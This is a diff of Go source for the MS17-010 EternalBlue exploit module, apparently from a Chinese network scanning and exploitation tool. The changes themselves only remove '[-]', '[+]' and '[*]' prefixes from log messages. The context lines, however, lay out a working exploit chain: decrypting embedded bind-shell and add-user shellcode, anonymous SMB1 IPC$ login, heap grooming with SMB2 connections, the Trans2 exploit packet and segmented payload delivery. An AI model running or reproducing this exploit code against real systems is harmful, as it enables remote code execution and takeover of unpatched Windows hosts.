@@ -26,7 +26,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("[-] %s MS17-010 解密bind shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 解密bind shellcode失败: %v", info.Host, err))
 			return
 		}
 
@@ -40,7 +40,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("[-] %s MS17-010 解密add shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 解密add shellcode失败: %v", info.Host, err))
 			return
 		}
 
@@ -50,7 +50,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("[-] %s MS17-010 解密guest shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 解密guest shellcode失败: %v", info.Host, err))
 			return
 		}
 
@@ -59,7 +59,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		if strings.Contains(Common.Shellcode, "file:") {
 			read, err := ioutil.ReadFile(Common.Shellcode[5:])
 			if err != nil {
-				Common.LogError(fmt.Sprintf("[-] MS17010读取Shellcode文件 %v 失败: %v", Common.Shellcode, err))
+				Common.LogError(fmt.Sprintf("MS17010读取Shellcode文件 %v 失败: %v", Common.Shellcode, err))
 				return
 			}
 			sc = fmt.Sprintf("%x", read)
@@ -70,25 +70,25 @@ func MS17010EXP(info *Common.HostInfo) {
 
 	// 验证shellcode有效性
 	if len(sc) < 20 {
-		fmt.Println("[-] 无效的Shellcode")
+		fmt.Println("无效的Shellcode")
 		return
 	}
 
 	// 解码shellcode
 	sc1, err := hex.DecodeString(sc)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] %s MS17-010 Shellcode解码失败: %v", info.Host, err))
+		Common.LogError(fmt.Sprintf("%s MS17-010 Shellcode解码失败: %v", info.Host, err))
 		return
 	}
 
 	// 执行EternalBlue漏洞利用
 	err = eternalBlue(address, 12, 12, sc1)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] %s MS17-010漏洞利用失败: %v", info.Host, err))
+		Common.LogError(fmt.Sprintf("%s MS17-010漏洞利用失败: %v", info.Host, err))
 		return
 	}
 
-	Common.LogSuccess(fmt.Sprintf("[*] %s\tMS17-010\t漏洞利用完成", info.Host))
+	Common.LogSuccess(fmt.Sprintf("%s\tMS17-010\t漏洞利用完成", info.Host))
 }
 
 // eternalBlue 执行EternalBlue漏洞利用
@@ -97,7 +97,7 @@ func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) erro
 	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16长度
 	scLen := len(sc)
 	if scLen > maxscSize {
-		return fmt.Errorf("[-] Shellcode大小超出限制: %d > %d (超出 %d 字节)",
+		return fmt.Errorf("Shellcode大小超出限制: %d > %d (超出 %d 字节)",
 			scLen, maxscSize, scLen-maxscSize)
 	}
 
@@ -124,42 +124,42 @@ func exploit(address string, grooms int, payload []byte) error {
 	// 建立SMB1匿名IPC连接
 	header, conn, err := smb1AnonymousConnectIPC(address)
 	if err != nil {
-		return fmt.Errorf("[-] 建立SMB连接失败: %v", err)
+		return fmt.Errorf("建立SMB连接失败: %v", err)
 	}
 	defer func() { _ = conn.Close() }()
 
 	// 发送SMB1大缓冲区数据
 	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
-		return fmt.Errorf("[-] 设置读取超时失败: %v", err)
+		return fmt.Errorf("设置读取超时失败: %v", err)
 	}
 	if err = smb1LargeBuffer(conn, header); err != nil {
-		return fmt.Errorf("[-] 发送大缓冲区失败: %v", err)
+		return fmt.Errorf("发送大缓冲区失败: %v", err)
 	}
 
 	// 初始化内存喷射线程
 	fhsConn, err := smb1FreeHole(address, true)
 	if err != nil {
-		return fmt.Errorf("[-] 初始化内存喷射失败: %v", err)
+		return fmt.Errorf("初始化内存喷射失败: %v", err)
 	}
 	defer func() { _ = fhsConn.Close() }()
 
 	// 第一轮内存喷射
 	groomConns, err := smb2Grooms(address, grooms)
 	if err != nil {
-		return fmt.Errorf("[-] 第一轮内存喷射失败: %v", err)
+		return fmt.Errorf("第一轮内存喷射失败: %v", err)
 	}
 
 	// 释放内存并执行第二轮喷射
 	fhfConn, err := smb1FreeHole(address, false)
 	if err != nil {
-		return fmt.Errorf("[-] 释放内存失败: %v", err)
+		return fmt.Errorf("释放内存失败: %v", err)
 	}
 	_ = fhsConn.Close()
 
 	// 执行第二轮内存喷射
 	groomConns2, err := smb2Grooms(address, 6)
 	if err != nil {
-		return fmt.Errorf("[-] 第二轮内存喷射失败: %v", err)
+		return fmt.Errorf("第二轮内存喷射失败: %v", err)
 	}
 	_ = fhfConn.Close()
 
@@ -173,42 +173,42 @@ func exploit(address string, grooms int, payload []byte) error {
 
 	// 发送最终漏洞利用数据包
 	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
-		return fmt.Errorf("[-] 设置读取超时失败: %v", err)
+		return fmt.Errorf("设置读取超时失败: %v", err)
 	}
 
 	finalPacket := makeSMB1Trans2ExploitPacket(header.TreeID, header.UserID, 15, "exploit")
 	if _, err = conn.Write(finalPacket); err != nil {
-		return fmt.Errorf("[-] 发送漏洞利用数据包失败: %v", err)
+		return fmt.Errorf("发送漏洞利用数据包失败: %v", err)
 	}
 
 	// 获取响应并检查状态
 	raw, _, err := smb1GetResponse(conn)
 	if err != nil {
-		return fmt.Errorf("[-] 获取漏洞利用响应失败: %v", err)
+		return fmt.Errorf("获取漏洞利用响应失败: %v", err)
 	}
 
 	// 提取NT状态码
 	ntStatus := []byte{raw[8], raw[7], raw[6], raw[5]}
-	Common.LogSuccess(fmt.Sprintf("[+] NT Status: 0x%08X", ntStatus))
+	Common.LogSuccess(fmt.Sprintf("NT Status: 0x%08X", ntStatus))
 
 	// 发送payload
-	Common.LogSuccess("[*] 开始发送Payload")
+	Common.LogSuccess("开始发送Payload")
 	body := makeSMB2Body(payload)
 
 	// 分段发送payload
 	for _, conn := range groomConns {
 		if _, err = conn.Write(body[:2920]); err != nil {
-			return fmt.Errorf("[-] 发送Payload第一段失败: %v", err)
+			return fmt.Errorf("发送Payload第一段失败: %v", err)
 		}
 	}
 
 	for _, conn := range groomConns {
 		if _, err = conn.Write(body[2920:4073]); err != nil {
-			return fmt.Errorf("[-] 发送Payload第二段失败: %v", err)
+			return fmt.Errorf("发送Payload第二段失败: %v", err)
 		}
 	}
 
-	Common.LogSuccess("[+] Payload发送完成")
+	Common.LogSuccess("Payload发送完成")
 	return nil
 }
 
@@ -236,7 +236,7 @@ func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
 	// 建立TCP连接
 	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
 	if err != nil {
-		return nil, nil, fmt.Errorf("[-] 连接目标失败: %v", err)
+		return nil, nil, fmt.Errorf("连接目标失败: %v", err)
 	}
 
 	// 连接状态标记
@@ -249,24 +249,24 @@ func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
 
 	// SMB协议协商
 	if err = smbClientNegotiate(conn); err != nil {
-		return nil, nil, fmt.Errorf("[-] SMB协议协商失败: %v", err)
+		return nil, nil, fmt.Errorf("SMB协议协商失败: %v", err)
 	}
 
 	// 匿名登录
 	raw, header, err := smb1AnonymousLogin(conn)
 	if err != nil {
-		return nil, nil, fmt.Errorf("[-] 匿名登录失败: %v", err)
+		return nil, nil, fmt.Errorf("匿名登录失败: %v", err)
 	}
 
 	// 获取系统版本信息
 	if _, err = getOSName(raw); err != nil {
-		return nil, nil, fmt.Errorf("[-] 获取系统信息失败: %v", err)
+		return nil, nil, fmt.Errorf("获取系统信息失败: %v", err)
 	}
 
 	// 连接IPC共享
 	header, err = treeConnectAndX(conn, address, header.UserID)
 	if err != nil {
-		return nil, nil, fmt.Errorf("[-] 连接IPC共享失败: %v", err)
+		return nil, nil, fmt.Errorf("连接IPC共享失败: %v", err)
 	}
 
 	ok = true
@@ -299,13 +299,13 @@ func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
 	// 读取NetBIOS会话服务头
 	buf := make([]byte, 4)
 	if _, err := io.ReadFull(conn, buf); err != nil {
-		return nil, nil, fmt.Errorf("[-] 读取NetBIOS会话服务头失败: %v", err)
+		return nil, nil, fmt.Errorf("读取NetBIOS会话服务头失败: %v", err)
 	}
 
 	// 校验消息类型
 	messageType := buf[0]
 	if messageType != 0x00 {
-		return nil, nil, fmt.Errorf("[-] 无效的消息类型: 0x%02X", messageType)
+		return nil, nil, fmt.Errorf("无效的消息类型: 0x%02X", messageType)
 	}
 
 	// 解析消息体大小
@@ -316,14 +316,14 @@ func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
 	// 读取SMB消息体
 	buf = make([]byte, messageSize)
 	if _, err := io.ReadFull(conn, buf); err != nil {
-		return nil, nil, fmt.Errorf("[-] 读取SMB消息体失败: %v", err)
+		return nil, nil, fmt.Errorf("读取SMB消息体失败: %v", err)
 	}
 
 	// 解析SMB头部
 	header := smbHeader{}
 	reader := bytes.NewReader(buf[:smbHeaderSize])
 	if err := binary.Read(reader, binary.LittleEndian, &header); err != nil {
-		return nil, nil, fmt.Errorf("[-] 解析SMB头部失败: %v", err)
+		return nil, nil, fmt.Errorf("解析SMB头部失败: %v", err)
 	}
 
 	return buf, &header, nil
@@ -335,27 +335,27 @@ func smbClientNegotiate(conn net.Conn) error {
 
 	// 构造NetBIOS会话服务头
 	if err := writeNetBIOSHeader(&buf); err != nil {
-		return fmt.Errorf("[-] 构造NetBIOS头失败: %v", err)
+		return fmt.Errorf("构造NetBIOS头失败: %v", err)
 	}
 
 	// 构造SMB协议头
 	if err := writeSMBHeader(&buf); err != nil {
-		return fmt.Errorf("[-] 构造SMB头失败: %v", err)
+		return fmt.Errorf("构造SMB头失败: %v", err)
 	}
 
 	// 构造协议协商请求
 	if err := writeNegotiateRequest(&buf); err != nil {
-		return fmt.Errorf("[-] 构造协议协商请求失败: %v", err)
+		return fmt.Errorf("构造协议协商请求失败: %v", err)
 	}
 
 	// 发送数据包
 	if _, err := buf.WriteTo(conn); err != nil {
-		return fmt.Errorf("[-] 发送协议协商数据包失败: %v", err)
+		return fmt.Errorf("发送协议协商数据包失败: %v", err)
 	}
 
 	// 获取响应
 	if _, _, err := smb1GetResponse(conn); err != nil {
-		return fmt.Errorf("[-] 获取协议协商响应失败: %v", err)
+		return fmt.Errorf("获取协议协商响应失败: %v", err)
 	}
 
 	return nil
@@ -428,22 +428,22 @@ func smb1AnonymousLogin(conn net.Conn) ([]byte, *smbHeader, error) {
 
 	// 构造NetBIOS会话服务头
 	if err := writeNetBIOSLoginHeader(&buf); err != nil {
-		return nil, nil, fmt.Errorf("[-] 构造NetBIOS头失败: %v", err)
+		return nil, nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
 	}
 
 	// 构造SMB协议头
 	if err := writeSMBLoginHeader(&buf); err != nil {
-		return nil, nil, fmt.Errorf("[-] 构造SMB头失败: %v", err)
+		return nil, nil, fmt.Errorf("构造SMB头失败: %v", err)
 	}
 
 	// 构造会话设置请求
 	if err := writeSessionSetupRequest(&buf); err != nil {
-		return nil, nil, fmt.Errorf("[-] 构造会话设置请求失败: %v", err)
+		return nil, nil, fmt.Errorf("构造会话设置请求失败: %v", err)
 	}
 
 	// 发送数据包
 	if _, err := buf.WriteTo(conn); err != nil {
-		return nil, nil, fmt.Errorf("[-] 发送登录数据包失败: %v", err)
+		return nil, nil, fmt.Errorf("发送登录数据包失败: %v", err)
 	}
 
 	// 获取响应
@@ -560,7 +560,7 @@ func getOSName(raw []byte) (string, error) {
 	char := make([]byte, 2)
 	for {
 		if _, err := io.ReadFull(reader, char); err != nil {
-			return "", fmt.Errorf("[-] 读取操作系统名称失败: %v", err)
+			return "", fmt.Errorf("读取操作系统名称失败: %v", err)
 		}
 
 		// 遇到结束符(0x00 0x00)时退出
@@ -590,17 +590,17 @@ func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, 
 
 	// 构造NetBIOS会话服务头
 	if err := writeNetBIOSTreeHeader(&buf); err != nil {
-		return nil, fmt.Errorf("[-] 构造NetBIOS头失败: %v", err)
+		return nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
 	}
 
 	// 构造SMB协议头
 	if err := writeSMBTreeHeader(&buf, userID); err != nil {
-		return nil, fmt.Errorf("[-] 构造SMB头失败: %v", err)
+		return nil, fmt.Errorf("构造SMB头失败: %v", err)
 	}
 
 	// 构造树连接请求
 	if err := writeTreeConnectRequest(&buf, address); err != nil {
-		return nil, fmt.Errorf("[-] 构造树连接请求失败: %v", err)
+		return nil, fmt.Errorf("构造树连接请求失败: %v", err)
 	}
 
 	// 更新数据包大小
@@ -608,13 +608,13 @@ func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, 
 
 	// 发送数据包
 	if _, err := buf.WriteTo(conn); err != nil {
-		return nil, fmt.Errorf("[-] 发送树连接请求失败: %v", err)
+		return nil, fmt.Errorf("发送树连接请求失败: %v", err)
 	}
 
 	// 获取响应
 	_, header, err := smb1GetResponse(conn)
 	if err != nil {
-		return nil, fmt.Errorf("[-] 获取树连接响应失败: %v", err)
+		return nil, fmt.Errorf("获取树连接响应失败: %v", err)
 	}
 
 	return header, nil
@@ -682,7 +682,7 @@ func writeTreeConnectRequest(buf *bytes.Buffer, address string) error {
 	// IPC路径
 	host, _, err := net.SplitHostPort(address)
 	if err != nil {
-		return fmt.Errorf("[-] 解析地址失败: %v", err)
+		return fmt.Errorf("解析地址失败: %v", err)
 	}
 	_, _ = fmt.Fprintf(buf, "\\\\%s\\IPC$", host)
 
@@ -707,7 +707,7 @@ func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
 	// 发送NT Trans请求获取事务头
 	transHeader, err := sendNTTrans(conn, header.TreeID, header.UserID)
 	if err != nil {
-		return fmt.Errorf("[-] 发送NT Trans请求失败: %v", err)
+		return fmt.Errorf("发送NT Trans请求失败: %v", err)
 	}
 
 	treeID := transHeader.TreeID
@@ -732,12 +732,12 @@ func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
 
 	// 发送组合数据包
 	if _, err := conn.Write(transPackets); err != nil {
-		return fmt.Errorf("[-] 发送大缓冲区数据失败: %v", err)
+		return fmt.Errorf("发送大缓冲区数据失败: %v", err)
 	}
 
 	// 获取响应
 	if _, _, err := smb1GetResponse(conn); err != nil {
-		return fmt.Errorf("[-] 获取大缓冲区响应失败: %v", err)
+		return fmt.Errorf("获取大缓冲区响应失败: %v", err)
 	}
 
 	return nil
@@ -749,28 +749,28 @@ func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
 
 	// 构造NetBIOS会话服务头
 	if err := writeNetBIOSNTTransHeader(&buf); err != nil {
-		return nil, fmt.Errorf("[-] 构造NetBIOS头失败: %v", err)
+		return nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
 	}
 
 	// 构造SMB协议头
 	if err := writeSMBNTTransHeader(&buf, treeID, userID); err != nil {
-		return nil, fmt.Errorf("[-] 构造SMB头失败: %v", err)
+		return nil, fmt.Errorf("构造SMB头失败: %v", err)
 	}
 
 	// 构造NT Trans请求
 	if err := writeNTTransRequest(&buf); err != nil {
-		return nil, fmt.Errorf("[-] 构造NT Trans请求失败: %v", err)
+		return nil, fmt.Errorf("构造NT Trans请求失败: %v", err)
 	}
 
 	// 发送数据包
 	if _, err := buf.WriteTo(conn); err != nil {
-		return nil, fmt.Errorf("[-] 发送NT Trans请求失败: %v", err)
+		return nil, fmt.Errorf("发送NT Trans请求失败: %v", err)
 	}
 
 	// 获取响应
 	_, header, err := smb1GetResponse(conn)
 	if err != nil {
-		return nil, fmt.Errorf("[-] 获取NT Trans响应失败: %v", err)
+		return nil, fmt.Errorf("获取NT Trans响应失败: %v", err)
 	}
 
 	return header, nil
@@ -1099,7 +1099,7 @@ func smb1FreeHole(address string, start bool) (net.Conn, error) {
 	// 建立TCP连接
 	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
 	if err != nil {
-		return nil, fmt.Errorf("[-] 连接目标失败: %v", err)
+		return nil, fmt.Errorf("连接目标失败: %v", err)
 	}
 
 	// 连接状态标记
@@ -1112,7 +1112,7 @@ func smb1FreeHole(address string, start bool) (net.Conn, error) {
 
 	// SMB协议协商
 	if err = smbClientNegotiate(conn); err != nil {
-		return nil, fmt.Errorf("[-] SMB协议协商失败: %v", err)
+		return nil, fmt.Errorf("SMB协议协商失败: %v", err)
 	}
 
 	// 根据开始/结束标志设置不同参数
@@ -1130,12 +1130,12 @@ func smb1FreeHole(address string, start bool) (net.Conn, error) {
 	// 构造并发送会话数据包
 	packet := makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS)
 	if _, err = conn.Write(packet); err != nil {
-		return nil, fmt.Errorf("[-] 发送内存释放会话数据包失败: %v", err)
+		return nil, fmt.Errorf("发送内存释放会话数据包失败: %v", err)
 	}
 
 	// 获取响应
 	if _, _, err = smb1GetResponse(conn); err != nil {
-		return nil, fmt.Errorf("[-] 获取会话响应失败: %v", err)
+		return nil, fmt.Errorf("获取会话响应失败: %v", err)
 	}
 
 	ok = true
@@ -1251,12 +1251,12 @@ func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
 		// 创建TCP连接
 		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
 		if err != nil {
-			return nil, fmt.Errorf("[-] 连接目标失败: %v", err)
+			return nil, fmt.Errorf("连接目标失败: %v", err)
 		}
 
 		// 发送SMB2头
 		if _, err = conn.Write(header); err != nil {
-			return nil, fmt.Errorf("[-] 发送SMB2头失败: %v", err)
+			return nil, fmt.Errorf("发送SMB2头失败: %v", err)
 		}
 
 		conns = append(conns, conn)
